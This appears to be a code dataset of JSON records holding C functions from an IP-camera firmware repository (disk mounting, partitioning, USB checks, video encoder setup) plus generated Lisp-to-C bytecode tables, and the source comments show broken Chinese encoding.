{"docstring": "/******************************************************************************\n* \u01a3hd_get_disk_info_for_frontpanel\n* \u04f2\u01f7 <\u01f0>\n* \n* unsigned char *disk_num\t\t\u04f2\u0334\u06b1\u05be\n*\t\t\tunsigned char *disk_full\t\u04f2\u05be\n*   \u05b50\n* \u07b8\u013c\u00bc: \n* \u02f5: \n********************************************************************************/\n", "func_signal": "int hd_get_disk_info_for_frontpanel(unsigned char *disk_num, unsigned char *disk_full)", "code": "{\n\tint i;\n\tint hd_num;\n\tunsigned char disk_num_status  = 0;\n\tunsigned char disk_full_status = 0;\n\n\tif (disk_num==NULL ||disk_full==NULL)\n\t{\n\t\treturn -1;\n\t}\n\t\n\thd_num = get_hard_disk_num();\n\n\tfor(i = 0; i < hd_num; i++)\n\t{\n\t\tdisk_num_status |= (1<<i);\n\t\tif (g_hard_disk_info.disk_info[i].partition_info[0].availabe_size < 300 )\n\t\t{\n\t\t\tdisk_full_status |= (1<<i);\n\t\t}\n\t}\n\n\t*disk_num  = disk_num_status;\n\t*disk_full = disk_full_status;\n\n\treturn 0;\n}", "path": "X_IPC\\N_IPC_4_change_3518gcc\\recordsdk\\hardDisk.c", "repo_name": "yeung908/lvjh_ipcamera_hisi3518", "stars": 35, "license": "None", "language": "c", "size": 36940}
{"docstring": "// \u01b5\u0123\n", "func_signal": "int videoEncModuleSetup()", "code": "{\n\tint i = 0;\n\tint ret = -1;\n\tVIDEO_STANDARD_PARAM standard;\n\tVENC_PARAM encParam;\t\n\tVIDEO_ENC_PARAM vencParam;\n\t\n\tgetVideoInStandardParam(0, &standard);\n\tgetVideoEncParam(0, 0, &encParam);\n\t\n\t//\u0436\u01b5\u02bd\n\tswitch (encParam.nEncodeHeight)\n\t{\n\tcase 576:\n\tcase 480:\n\t\tif (encParam.nEncodeWidth == 720)\n\t\t{\n\t\t\tstandard.nStandard |= 0x00;\n\t\t}\n\t\tif (encParam.nEncodeWidth == 640)\n\t\t{\n\t\t\tstandard.nStandard = 4;\n\t\t\t#ifdef HD_CMOS\n\t\t\tstandard.nStandard = 9;\n\t\t\tprintf(\"<<<<<<<<<<<<<<<<<<<<<<<<<<<<\\n\");\n\t\t\tprintf(\"standard.nStandard = 9\\n\");\n\t\t\t#endif\n\t\t}\n\t\tif (encParam.nEncodeWidth == 720)\n\t\t{\n\t\t\tstandard.nStandard = 8;\n\t\t}\n\t\t\n\t\tbreak;\n\t\t\n\tcase 288:\n\tcase 240:\n\t\tprintf(\"Entry primary videoEncModuleSetup function...\\n\");\n\t\tif (encParam.nEncodeWidth==720 || encParam.nEncodeWidth==704)\n\t\t{\n\t\t\tstandard.nStandard |= 0x01000000;\n\t\t}\n\t\telse if (encParam.nEncodeWidth == 352)\n\t\t{\n\t\t\tstandard.nStandard |= 0x02000000;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tstandard.nStandard = 5;\n\t\t}\n\t\tbreak;\n\t\t\n\tcase 144:\n\tcase 120:\n\tcase 112:\n\tcase 128:\n\t\tstandard.nStandard |= 0x03000000;\n\t\tbreak;\n\n\tcase 1200:\n\t\tstandard.nStandard = 6;\n\t\tbreak;\n\n\tcase 720:\n\t\tstandard.nStandard = 7;\n\t\tbreak;\n\t\t\t\t\n\tdefault:\n\t\tstandard.nStandard |= 0x02000000;\n\t\tbreak;\n\t}\n\t\n\t// VIN\n\tif (g_video_max_channel == 1)\n\t{\n\t\tret = videoInSetup(0, standard.nStandard);\n\t}\n\telse\n\t{\n\t\tstandard.nStandard &= 0x00FFFFFF;\n\t\tret = videoInSetup(0, standard.nStandard);\n\t}\n\t\n\t// \u01b5\n\tfor (i=0; i<g_video_max_channel; i++)\n\t{\n\t\tmemset(&encParam, 0, sizeof(VENC_PARAM));\n\t\tgetVideoEncParam(i, 0, &encParam);\n\t\tprintf(\"**************************encModule*****************\\n\");\n\t\tprintf(\"encParam.nEncodeHeight = %d, encParam.nEncodeWidth = %d\\n\", encParam.nEncodeHeight, encParam.nEncodeWidth);\n\t\tmemcpy(&vencParam.param.encParam, &encParam, sizeof(VENC_PARAM));\n\t\t\n\t\tret = videoEncSetup(i, 0, venc_setup_enc_param, &vencParam);\n\t\tif (ret < 0)\n\t\t{\n\t\t\tprintf(\"videoEncSetup1(%s %d) Failed!\\n\", __FILE__, __LINE__);\n\t\t\treturn -1;\n\t\t}\n\t\t// Add the code by lvjh, 2008-03-29\n\t\t//setVideoFormat(i, 0, encParam.nEncodeWidth, encParam.nEncodeHeight);\n\t\tsetVideoFormat(i, 0, encParam.nEncodeWidth, encParam.nEncodeHeight, encParam.reserve);\n\t\t\n\t\tmemset(&encParam, 0, sizeof(VENC_PARAM));\n\t\tgetVideoEncParam(i, 1, &encParam);\n\n\t\t#ifdef YIYUAN_VIDEO\n\t\tencParam.nEncodeWidth = 704;\n\t\tencParam.nEncodeHeight = 576;\n\t\t#endif\n\t\tmemcpy(&vencParam.param.encParam, &encParam, sizeof(VENC_PARAM));\n\t\t\n\t\tret = videoEncSetup(i, 1, venc_setup_enc_param, &vencParam);\n\t\tif (ret < 0)\n\t\t{\n\t\t\tprintf(\"videoEncSetup2(%s %d) Failed!\\n\", __FILE__, __LINE__);\n\t\t\treturn -1;\n\t\t}\n\t\t// Add the code by lvjh, 2008-03-29\n\t\t//setVideoFormat(i, 1, encParam.nEncodeWidth, encParam.nEncodeHeight);\n\t\t\n\n\t\tsetVideoFormat(i, 1, encParam.nEncodeWidth, encParam.nEncodeHeight, encParam.reserve);\n\t}\n\t\n\treturn 0;\n}", "path": "X_IPC\\N_IPC_4_change_3518gcc\\videoEncAppModule.c", "repo_name": "yeung908/lvjh_ipcamera_hisi3518", "stars": 35, "license": "None", "language": "c", "size": 36940}
{"docstring": "/******************************************************************************\n* \u01a3CDRecord_GetDeviceName\n* CDRecorder\u01f7\n* \n* \n*   \u05b5: 1; : 0\n* \u07b8\u013c\u00bc: \n* \u02f5: \n********************************************************************************/\n", "func_signal": "int Check_CDRecorder()", "code": "{\n\t//int  fd;\n\t//int  ret;\n\t//char buf[128];\n\tFILE *fp = NULL;\n    int  nCDRecorderNum = 0;\n\n    if ((fp = fopen(CDRecorderName, \"r\")) == NULL)\n\t{\n\t\tnCDRecorderNum = 0;\n\t\tprintf(\"not find cd\\n\");\n    }\n\telse\n\t{\n\t\tfclose(fp);\n\t\tnCDRecorderNum = 1;\n\t\tprintf(\"find cd\\n\");\n\t}\n\treturn nCDRecorderNum;\n}", "path": "X_IPC\\N_IPC_4_change_3518gcc\\recordsdk\\hardDisk.c", "repo_name": "yeung908/lvjh_ipcamera_hisi3518", "stars": 35, "license": "None", "language": "c", "size": 36940}
{"docstring": "// \u01b5\u037b\u0635\n", "func_signal": "int videoEncModuleSetvideoSendFunc(videoSendFun_t bitratevideoSendFunc, videoSendFun_t jpegvideoSendFunc)", "code": "{\n\tg_bitrate_send_fun = bitratevideoSendFunc;\n\tg_jpeg_send_fun = jpegvideoSendFunc;\n\n\treturn 0;\n}", "path": "X_IPC\\N_IPC_4_change_3518gcc\\videoEncAppModule.c", "repo_name": "yeung908/lvjh_ipcamera_hisi3518", "stars": 35, "license": "None", "language": "c", "size": 36940}
{"docstring": "/******************************************************************************\n* \u01a3hd_fdisk\n* \u04f2\u0337\n* int disk_no\t\t\t\t\u04f2\u033a\n*\t\t\tint data_partition\t\t\u0777\n*\t\t\tint backup_partition\t\u0777\n* \n*   \u05b5\u0279:0; \u02a7: -1\n* \u07b8\u013c\u00bc: \n* \u02f5: \n********************************************************************************/\n", "func_signal": "int hd_fdisk(int disk_no,int data_partition,int backup_partition)", "code": "{\n\tint ret;\n\tint disk_num;\n\tint cur_disk_no;\n\n\tcur_disk_no = g_hard_disk_info.cur_disk_no;\n\n\tdisk_num = get_hard_disk_num();\n\tif ( disk_no > (disk_num - 1) )\n\t{\n\t\treturn -4;\n\t}\n\n\tif ( disk_no == cur_disk_no )\t// \u01f5\u01f0\n\t{\n\t\t//\u0363\u00bc\n\t\t//pause_record_file();\n\n\t\t// umount\u04f2\u0335\u0437 \n\t\tret = hd_umount_disk(disk_no);\n\t\tif (ret < 0)\n\t\t{\n\t\t\t//\u05b8\u00bc\n\t\t\t//restart_record_file();\n\t\t\t\n\t\t\treturn -1;\n\t\t}\n\n\t\t// \u02bd\u04f2 \n\t\tret = tm3k_HD_FDisk(tm3k_HD_GetDiskName(disk_no),data_partition,backup_partition);\n\t\tif (ret != 0)\n\t\t\tprintf(\"fdisk disk: %s failed \\n\",tm3k_HD_GetDiskName(disk_no));\n\t\telse\n\t\t\tprintf(\"fdisk disk: %s success \\n\",tm3k_HD_GetDiskName(disk_no));\n\n\t\t// mount\u04f2\u0335\u0437 \n\t\thd_mount_disk(disk_no);\n\n\t\t//\u05b8\u03f5\u0373\n\t\t//restart_record_file();\n\t}\n\telse\t\t// \u01f5\u01f0\n\t{\n\t\t// umount\u04f2\u0335\u0437 \n\t\tret = hd_umount_disk(disk_no);\n\t\tif(ret < 0)\n\t\t{\n\t\t\treturn -1;\n\t\t}\n\t\t\n\t\t// \u02bd\u04f2 \n\t\tret = tm3k_HD_FDisk(tm3k_HD_GetDiskName(disk_no),data_partition,backup_partition);\n\t\tif (ret != 0)\n\t\t\tprintf(\"fdisk disk: %s failed \\n\",tm3k_HD_GetDiskName(disk_no));\n\t\telse\n\t\t\tprintf(\"fdisk disk: %s success \\n\",tm3k_HD_GetDiskName(disk_no));\n\n\t\t// mount\u04f2\u0335\u0437 \n\t\thd_mount_disk(disk_no);\n\t}\n\treturn ret;\n}", "path": "X_IPC\\N_IPC_4_change_3518gcc\\recordsdk\\hardDisk.c", "repo_name": "yeung908/lvjh_ipcamera_hisi3518", "stars": 35, "license": "None", "language": "c", "size": 36940}
{"docstring": "/******************************************************************************\n* \u01a3hd_cur_partition_full\n* \u04f2\u01f7\n* int disk_no\t\t\t\t\u04f2\u033a\n*\t\t\tint partition_no\t\t\n* \n*   \u05b5\u03b4:0; : 1\n* \u07b8\u013c\u00bc: \n* \u02f5: \n********************************************************************************/\n", "func_signal": "int hd_cur_partition_full(int disk_no, int partition_no)", "code": "{\n\tchar partition_name[MAX_PATH];\n\tDISKSIZE disk_size;\n\n\tget_partition_name(partition_name,disk_no,partition_no);\n\ttm3k_HD_GetDiskInfo(partition_name,&disk_size);\n\tg_hard_disk_info.disk_info[disk_no].partition_info[partition_no].availabe_size = disk_size.availablesize;\n\n\t// \u04f2\u033f\u057c\u0421300M,\u03aa\u04f2\u00fb\u043f\u057c \n\tif (disk_size.availablesize < 300) \n\t{\n\t\treturn 1;\n\t}\n\n\treturn 0;\n}", "path": "X_IPC\\N_IPC_4_change_3518gcc\\recordsdk\\hardDisk.c", "repo_name": "yeung908/lvjh_ipcamera_hisi3518", "stars": 35, "license": "None", "language": "c", "size": 36940}
{"docstring": "/******************************************************************************\n* \u01a3CDRecord_GetDeviceName\n* USB\u01f7\n* \n* \n*   \u05b5\u05b5,USB\u0335\u0138\n* \u07b8\u013c\u00bc: \n* \u02f5: \n********************************************************************************/\n", "func_signal": "int check_usb_disk_num()", "code": "{\n\tint  fd;\n\tint  ret;\n\tint  i;\n\tchar buf[128];\n    int  nUsbNum = 0;\n\n\tUsbIndex[0] = -1;\n\tUsbIndex[1] = -1;\n\tUsbIndex[2] = -1;\n\tUsbIndex[3] = -1;\n\n\tfor(i = 0; i < 4; i++)\n\t{\n\t\tfd = open(USBName[i], O_RDWR );         //| O_NOCTTY | O_NDELAY\n \t\tif(fd >= 0)\n\t\t{\n\t\t\tret = read(fd, buf, 128);\n\t\t\tif(ret > 0)\n\t\t\t{\n\t\t\t\tclose(fd);\n\t\t\t    UsbIndex[nUsbNum] = i;\n             \tnUsbNum ++;\n\t\t\t}\n\t\t\tclose(fd);\n\t\t}\n\t}\n\treturn nUsbNum;\n}", "path": "X_IPC\\N_IPC_4_change_3518gcc\\recordsdk\\hardDisk.c", "repo_name": "yeung908/lvjh_ipcamera_hisi3518", "stars": 35, "license": "None", "language": "c", "size": 36940}
{"docstring": "/******************************************************************************\n* \u01a3hd_find_empty_partition\n* \u03b4(\u0777)\n* \n* int *disk_no\t\t\u04f2\u033a\n*\t\t\tint *partition_no\t\n*   \u05b5\u0279:0; \u02a7: -1\n* \u07b8\u013c\u00bc: \n* \u02f5: \n********************************************************************************/\n", "func_signal": "int hd_find_empty_partition(int *disk_no,int *partition_no)", "code": "{\n\tint i;\n\tint ret = 0;\n\tchar partition_name[MAX_PATH];\n\tDISKSIZE disk_size;\n\tint  disk_num;\n\n\t*disk_no = -1;\n\t*partition_no = -1;\n\n\t// \u05bb\u0777,\u00ff\u04f2\u0335\u0135\u04bb\u03aa \n\tdisk_num = get_hard_disk_num();\n\t\n\tfor (i=0; i<disk_num; i++)\n\t{\n\t\tif ( g_hard_disk_info.disk_info[i].partition_info[0].format_flag == 1 )\t//\u01f7\u02bd\n\t\t{\t\t\t\t\t\t\t\n\t\t\t//\u03aa\u0777\n\t\t\tif (g_hard_disk_info.disk_info[i].partition_info[0].mount_flag && g_hard_disk_info.disk_info[i].partition_info[0].type != 2 )\n\t\t\t{\n\t\t\t\tget_partition_name(partition_name,i,0);\n\t\t\t\t\n\t\t\t\tret = tm3k_HD_GetDiskInfo(partition_name,&disk_size);\n\n\t\t\t\tg_hard_disk_info.disk_info[i].partition_info[0].availabe_size = disk_size.availablesize;\n\n\t\t\t\t// \u04f2\u033f\u057c300M,\u03aa\u04f2\u043f\u057c \n\t\t\t\tif (disk_size.availablesize >= 300)\n\t\t\t\t{\n\t\t\t\t\t*disk_no = i;\n\t\t\t\t\t*partition_no = 0;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\tif (*disk_no == -1 || *partition_no == -1)\n\t\treturn -1;\n\telse\n\t\treturn 0;\n}", "path": "X_IPC\\N_IPC_4_change_3518gcc\\recordsdk\\hardDisk.c", "repo_name": "yeung908/lvjh_ipcamera_hisi3518", "stars": 35, "license": "None", "language": "c", "size": 36940}
{"docstring": "/******************************************************************************\n* \u01a3hd_get_partition_available_size\n* \u0221\u00ff\u057c\n* int disk_no\t\t\t\u04f2\u033a\n*\t\t\tint partition_no\t\n* \n*   \u05b5\u05b5\u00ff\u057c\n* \u07b8\u013c\u00bc: \n* \u02f5: \n********************************************************************************/\n", "func_signal": "int hd_get_partition_available_size(int disk_no,int partition_no)", "code": "{\n\tchar partition_name[MAX_PATH];\n\tDISKSIZE disk_size;\n\n\tget_partition_name(partition_name,disk_no,partition_no);\n\ttm3k_HD_GetDiskInfo(partition_name,&disk_size);\n\n\tg_hard_disk_info.disk_info[disk_no].partition_info[partition_no].availabe_size = disk_size.availablesize;\n\n\treturn disk_size.availablesize;\n}", "path": "X_IPC\\N_IPC_4_change_3518gcc\\recordsdk\\hardDisk.c", "repo_name": "yeung908/lvjh_ipcamera_hisi3518", "stars": 35, "license": "None", "language": "c", "size": 36940}
{"docstring": "/******************************************************************************\n* \u01a3hd_mount_partition\n* MOUNT\n* char *source\t\u04f2\u0337\u8c78\n*\t\t\tchar *target\t\u04f2\u0337MOUNT\u013f\n* \n*   \u05b5\u0279: 0; \u02a7: -1\n* \u07b8\u013c\u00bc: \n* \u02f5: \n********************************************************************************/\n", "func_signal": "int hd_mount_partition(char *source, char *target)", "code": "{\n\tint ret = -1;\n\tint i = 0;\n\n\tif (source==NULL || target==NULL)\n\t{\n\t\treturn -1;\n\t}\t\n\n\tdo\n\t{\n\t\tret = mount(source, target, \"vfat\", 0, NULL);\n\t\tif (ret != 0)\n\t\t{\n\t\t\tprintf(\"mount %s to %s failed = %d\\n\", source, target, i);\n\t\t\tsleep(1);\n\t\t}\n\t\telse\n\t\t{\n\t\t\treturn 0;\n\t\t}\n\t\t\n\t\ti++;\n\t}while(i < 10 ); //\u0ce210\n\n\treturn -1;\n}", "path": "X_IPC\\N_IPC_4_change_3518gcc\\recordsdk\\hardDisk.c", "repo_name": "yeung908/lvjh_ipcamera_hisi3518", "stars": 35, "license": "None", "language": "c", "size": 36940}
{"docstring": "/* Initialize module list */\n", "func_signal": "void initialize_module_list()", "code": "{\n  if (is_initialized) return;\n  initialize_module_telos();\n  initialize_module_convert();\n  initialize_module_compare();\n  initialize_module_collect();\n  initialize_module_copy();\n  initialize_module_number();\n  initialize_module_fpi();\n  eul_fast_table_set(eul_modules,\"list\",(LispRef) list_bindings);\n  is_initialized = 1;\n  {\n  /* Declarations */\n  LispRef sym_4710, sym_4709, sym_4708, sym_4707, sym_4706, sym_4705, sym_4704, sym_4703, sym_4702, sym_4701, sym_4700, sym_4699, sym_4698, sym_4697, sym_4696, sym_4695, sym_4694, sym_4693, sym_4692, sym_4691, sym_4690, sym_4689, sym_4688, sym_4687, sym_4686, sym_4685, sym_4684, sym_4683, sym_4682, sym_4681, sym_4680, sym_4679, sym_4678, sym_4677, sym_4676, sym_4675, sym_4674, sym_4673, sym_4672, sym_4671, sym_4670, sym_4669, sym_4668, sym_4667, G004666, G004664, G004662, G004660, G004658, G004656, G004654, G004652, G004650, G004648, G004646, G004644, G004642, G004640, G004638, G004636, G004634, G004632, G004630, G004628, G004626, G004624, G004622, G004620, G004618, G004616, G004614, G004612, G004610, G004608, G004606, G004604, G004602, G004600, G004598, G004596, G004594, G004592, G004590, G004588, G004586, G004584, G004582, G004580, G004578, G004576, G004574, G004572, G004570, G004568, G004566, G004564, G004562, G004560, sym_4558, sym_4557, sym_4556, sym_4555, sym_4554, sym_4551, sym_4549, sym_4547, sym_4546, sym_4545, sym_4544, sym_4543, sym_4542, sym_4541, sym_4540, sym_4539, sym_4538, sym_4537, sym_4536, sym_4535, sym_4534, sym_4533, sym_4532, sym_4531, sym_4530, sym_4529, sym_4528, sym_4527, sym_4526, sym_4525, sym_4524, sym_4523, sym_4522, sym_4521, sym_4520, sym_4519, sym_4518, sym_4517, sym_4516, sym_4515, sym_4514, sym_4513, sym_4512, sym_4511, sym_4510, sym_4509, sym_4508, sym_4507, sym_4506, sym_4505, sym_4504, sym_4503, sym_4502, G004501, G004499, G004497, G004495, G004493, G004491, G004489, G004487, G004485, G004483, G004481, G004479, G004477, G004475, G004473, G004471, G004469, G004467, G004465, G004463, G004461, G004459, G004457, G004455, G004453, G004451, G004449, G004447, G004445, G004443, G004441, G004439, G004437, G004435, G004433, G004431, G004429, G004427, G004425, G004423, G004421, G004419, G004417, G004415, G004413, G004411, G004409, G004407, G004405, G004403, G004401, G004399, G004397, G004395, G004393, G004391, G004389, G004387, G004385, G004383, G004381, G004379, sym_4377, G004376, G004374, G004372;\n\n  /* Code vector and literal definitions */\n  /* Byte-vector with size: 10 is_init: 0 index: 45 binding: anonymous */\n  static const void *G004371[] = {I(aa,47,00,01),I(10,1c,47,00),I(00,1d,24,00),B(boot ,27),I(3c,03,1b,44),I(11,1d,47,00),I(02,0f,1b,48),I(00,02,47,00),I(02,22,01,36),I(02,86,45,03)};\n\n  /* Byte-vector with size: 8 is_init: 0 index: 46 binding: anonymous */\n  static const void *G004373[] = {I(aa,1b,47,00),I(00,86,6c,1b),I(44,11,1c,47),I(00,02,0f,1b),I(48,00,02,47),I(00,02,22,01),I(36,02,86,45),I(02,00,00,00)};\n\n  /* Byte-vector with size: 23 is_init: 0 index: 48 binding: (method-binary/) */\n  static const void *G004375[] = {I(43,fd,46,03),I(1d,48,00,00),I(1b,48,00,01),I(86,1b,48,00),I(02,47,00,01),I(12,1b,44,21),I(23,00,00,00),B(list ,47),I(23,00,00,00),B(list ,46),I(3b,01,1f,04),I(24,00,00,00),B(boot ,17),I(3c,02,36,1f),I(23,00,00,00),B(list ,47),I(23,00,00,00),B(list ,45),I(3b,01,1f,04),I(24,00,00,00),B(boot ,17),I(3c,02,2a,47),I(00,02,45,05)};\n\n  /* Byte-vector with size: 10 is_init: 0 index: 49 binding: anonymous */\n  static const void *G004378[] = {I(aa,47,00,01),I(10,1c,47,00),I(00,1d,24,00),B(boot ,27),I(3c,03,1b,44),I(04,86,36,0f),I(1d,47,00,02),I(0f,1b,48,00),I(02,47,00,02),I(22,01,45,03)};\n\n  /* Byte-vector with size: 8 is_init: 0 index: 50 binding: anonymous */\n  static const void *G004380[] = {I(aa,1b,47,00),I(00,86,6c,1b),I(44,04,86,36),I(0f,1c,47,00),I(02,0f,1b,48),I(00,02,47,00),I(02,22,01,45),I(02,00,00,00)};\n\n  /* Byte-vector with size: 23 is_init: 0 index: 51 binding: (method-binary-) */\n  static const void *G004382[] = {I(43,fd,46,03),I(1c,48,00,00),I(1b,48,00,01),I(86,1b,48,00),I(02,47,00,01),I(12,1b,44,21),I(23,00,00,00),B(list ,47),I(23,00,00,00),B(list ,50),I(3b,01,1f,05),I(24,00,00,00),B(boot ,17),I(3c,02,36,1f),I(23,00,00,00),B(list ,47),I(23,00,00,00),B(list ,49),I(3b,01,1f,05),I(24,00,00,00),B(boot ,17),I(3c,02,2a,47),I(00,02,45,05)};\n\n  /* Byte-vector with size: 10 is_init: 0 index: 52 binding: anonymous */\n  static const void *G004384[] = {I(aa,47,00,01),I(10,1c,47,00),I(00,1d,24,00),B(boot ,27),I(3c,03,1b,44),I(04,86,36,0f),I(1d,47,00,02),I(0f,1b,48,00),I(02,47,00,02),I(22,01,45,03)};\n\n  /* Byte-vector with size: 8 is_init: 0 index: 53 binding: anonymous */\n  static const void *G004386[] = {I(aa,1b,47,00),I(00,86,6c,1b),I(44,04,86,36),I(0f,1c,47,00),I(02,0f,1b,48),I(00,02,47,00),I(02,22,01,45),I(02,00,00,00)};\n\n  /* Byte-vector with size: 27 is_init: 0 index: 54 binding: (method-binary+) */\n  static const void *G004388[] = {I(43,fd,46,03),I(1d,48,00,00),I(1b,48,00,01),I(86,1b,48,00),I(02,47,00,01),I(12,1b,44,21),I(23,00,00,00),B(list ,47),I(23,00,00,00),B(list ,53),I(3b,01,1f,04),I(24,00,00,00),B(boot ,17),I(3c,02,36,1f),I(23,00,00,00),B(list ,47),I(23,00,00,00),B(list ,52),I(3b,01,1f,04),I(24,00,00,00),B(boot ,17),I(3c,02,2a,47),I(00,00,47,00),I(02,24,00,00),B(boot ,8),I(3d,02,05,45),I(05,00,00,00)};\n\n  /* Byte-vector with size: 18 is_init: 0 index: 55 binding: anonymous */\n  static const void *G004390[] = {I(ab,1c,7a,1b),I(44,22,1d,11),I(1f,03,10,1b),I(24,00,00,00),B(copy ,3),I(3c,01,1b,1f),I(05,0f,1f,03),I(1c,47,00,01),I(3d,02,07,22),I(04,36,20,1d),I(44,15,1d,24),B(copy ,3),I(3c,01,1d,1c),I(47,00,00,3d),I(02,04,22,01),I(36,09,1c,86),I(47,00,00,3d),I(02,03,45,03)};\n\n  /* Byte-vector with size: 8 is_init: 0 index: 56 binding: anonymous */\n  static const void *G004392[] = {I(ab,1c,12,1b),I(44,04,1c,36),I(14,1d,11,1f),I(03,10,1b,1f),I(04,0f,1d,1c),I(47,00,00,3d),I(02,06,22,03),I(45,03,00,00)};\n\n  /* Byte-vector with size: 16 is_init: 0 index: 57 binding: (method-deep-copy) */\n  static const void *G004394[] = {I(aa,46,02,86),I(86,1c,48,00),I(00,1b,48,00),I(01,23,00,00),B(list ,47),I(23,00,00,00),B(list ,56),I(3b,02,48,00),I(00,23,00,00),B(list ,47),I(23,00,00,00),B(list ,55),I(3b,02,48,00),I(01,1d,86,47),I(00,01,3d,02),I(03,45,03,00)};\n\n  /* Byte-vector with size: 10 is_init: 0 index: 58 binding: anonymous */\n  static const void *G004396[] = {I(ab,1c,7a,1b),I(44,16,1d,11),I(1f,03,10,1b),I(1f,04,0f,1d),I(1c,47,00,01),I(3d,02,06,22),I(03,36,0a,1c),I(1f,03,47,00),I(00,3d,02,03),I(45,03,00,00)};\n\n  /* Byte-vector with size: 8 is_init: 0 index: 59 binding: anonymous */\n  static const void *G004398[] = {I(ab,1c,12,1b),I(44,04,1c,36),I(14,1d,11,1f),I(03,10,1b,1f),I(04,0f,1d,1c),I(47,00,00,3d),I(02,06,22,03),I(45,03,00,00)};\n\n  /* Byte-vector with size: 16 is_init: 0 index: 60 binding: (method-shallow-copy) */\n  static const void *G004400[] = {I(aa,46,02,86),I(86,1c,48,00),I(00,1b,48,00),I(01,23,00,00),B(list ,47),I(23,00,00,00),B(list ,59),I(3b,02,48,00),I(00,23,00,00),B(list ,47),I(23,00,00,00),B(list ,58),I(3b,02,48,00),I(01,1d,86,47),I(00,01,3d,02),I(03,45,03,00)};\n\n  /* Byte-vector with size: 3 is_init: 0 index: 61 binding: (method-accumulate1) */\n  static const void *G004402[] = {I(ab,24,00,00),B(list ,24),I(3d,02,00,00)};\n\n  /* Byte-vector with size: 3 is_init: 0 index: 62 binding: (method-accumulate) */\n  static const void *G004404[] = {I(43,03,24,00),B(list ,26),I(3d,03,00,00)};\n\n  /* Byte-vector with size: 3 is_init: 0 index: 63 binding: (method-slice) */\n  static const void *G004406[] = {I(43,03,24,00),B(list ,40),I(3d,03,00,00)};\n\n  /* Byte-vector with size: 15 is_init: 0 index: 64 binding: anonymous */\n  static const void *G004408[] = {I(aa,1b,12,1b),I(44,06,47,00),I(00,36,2f,1c),I(10,1b,24,00),B(mop_class ,74),I(24,00,00,00),B(convert ,2),I(3c,02,47,00),I(00,1c,24,00),B(boot ,8),I(3c,02,1b,48),I(00,00,1f,04),I(11,47,00,01),I(3d,01,05,22),I(03,45,02,00)};\n\n  /* Byte-vector with size: 11 is_init: 0 index: 65 binding: (method-concatenate) */\n  static const void *G004410[] = {I(a7,46,02,1c),I(48,00,00,86),I(1b,48,00,01),I(23,00,00,00),B(list ,47),I(23,00,00,00),B(list ,64),I(3b,01,48,00),I(01,1c,47,00),I(01,3d,01,03),I(45,03,00,00)};\n\n  /* Byte-vector with size: 6 is_init: 0 index: 66 binding: (method-remove) */\n  static const void *G004412[] = {I(43,fd,24,00),B(boot ,18),I(1f,03,1f,03),I(1f,03,24,00),B(boot ,5),I(3d,04,03,00)};\n\n  /* Byte-vector with size: 8 is_init: 0 index: 67 binding: (method-sort) */\n  static const void *G004414[] = {I(a7,1b,44,05),I(1b,10,36,09),I(24,00,00,00),B(compare ,6),I(1d,1c,24,00),B(boot ,16),I(3d,02,03,45),I(03,00,00,00)};\n\n  /* Byte-vector with size: 3 is_init: 0 index: 68 binding: (method-reverse) */\n  static const void *G004416[] = {I(aa,24,00,00),B(boot ,28),I(3d,01,00,00)};\n\n  /* Byte-vector with size: 7 is_init: 0 index: 69 binding: (method-select) */\n  static const void *G004418[] = {I(43,fd,1b,12),I(1b,44,0f,1f),I(03,1f,03,24),B(list ,37),I(3d,02,04,36),I(04,38,03,01),I(45,04,00,00)};\n\n  /* Byte-vector with size: 18 is_init: 0 index: 70 binding: (method-all?) */\n  static const void *G004420[] = {I(43,fd,1b,12),I(1b,44,0f,1f),I(03,1f,03,24),B(list ,38),I(3d,02,04,36),I(30,1c,11,12),I(1b,44,25,1d),I(10,1b,24,00),B(mop_class ,74),I(24,00,00,00),B(convert ,2),I(3c,02,1f,06),I(1f,06,1d,24),B(list ,10),I(3d,03,07,22),I(02,36,04,38),I(03,02,22,01),I(45,04,00,00)};\n\n  /* Byte-vector with size: 7 is_init: 0 index: 71 binding: (method-any?) */\n  static const void *G004422[] = {I(43,fd,1b,12),I(1b,44,0f,1f),I(03,1f,03,24),B(boot ,31),I(3d,02,04,36),I(04,38,03,01),I(45,04,00,00)};\n\n  /* Byte-vector with size: 11 is_init: 0 index: 72 binding: anonymous */\n  static const void *G004424[] = {I(ab,1c,7a,12),I(1b,44,04,1d),I(36,21,1d,10),I(47,00,00,1c),I(47,00,02,3c),I(02,1b,44,05),I(1f,03,36,0d),I(1f,04,11,1f),I(04,2b,47,00),I(01,3d,02,05),I(22,02,45,03)};\n\n  /* Byte-vector with size: 19 is_init: 0 index: 73 binding: (method-find) */\n  static const void *G004426[] = {I(43,fd,46,04),I(1d,48,00,00),I(1b,12,1b,44),I(11,47,00,00),I(1f,03,24,00),B(list ,8),I(3d,02,04,36),I(2c,1c,10,1b),I(48,00,02,86),I(1b,48,00,01),I(23,00,00,00),B(list ,47),I(23,00,00,00),B(list ,72),I(3b,02,48,00),I(01,1f,04,82),I(47,00,01,3d),I(02,06,22,02),I(45,04,00,00)};\n\n  /* Byte-vector with size: 6 is_init: 0 index: 74 binding: (method-member) */\n  static const void *G004428[] = {I(43,fd,24,00),B(boot ,27),I(1f,03,1f,03),I(1f,03,24,00),B(boot ,5),I(3d,04,03,00)};\n\n  /* Byte-vector with size: 3 is_init: 0 index: 75 binding: (method-size) */\n  static const void *G004430[] = {I(aa,24,00,00),B(boot ,19),I(3d,01,00,00)};\n\n  /* Byte-vector with size: 8 is_init: 0 index: 76 binding: (method-(setter element)) */\n  static const void *G004432[] = {I(43,03,24,00),B(boot ,26),I(24,00,00,00),B(boot1 ,42),I(3c,01,1f,03),I(1f,03,1f,03),I(1f,03,3d,03),I(04,45,04,00)};\n\n  /* Byte-vector with size: 3 is_init: 0 index: 77 binding: (method-element) */\n  static const void *G004434[] = {I(ab,24,00,00),B(boot ,26),I(3d,02,00,00)};\n\n  /* Byte-vector with size: 3 is_init: 0 index: 78 binding: (setter-cddddr) */\n  static const void *G004436[] = {I(ab,1c,75,11),I(1b,1d,90,45),I(03,00,00,00)};\n\n  /* Byte-vector with size: 3 is_init: 0 index: 79 binding: (setter-cdddar) */\n  static const void *G004438[] = {I(ab,1c,74,11),I(1b,1d,90,45),I(03,00,00,00)};\n\n  /* Byte-vector with size: 3 is_init: 0 index: 80 binding: (setter-cddadr) */\n  static const void *G004440[] = {I(ab,1c,73,11),I(1b,1d,90,45),I(03,00,00,00)};\n\n  /* Byte-vector with size: 3 is_init: 0 index: 81 binding: (setter-cddaar) */\n  static const void *G004442[] = 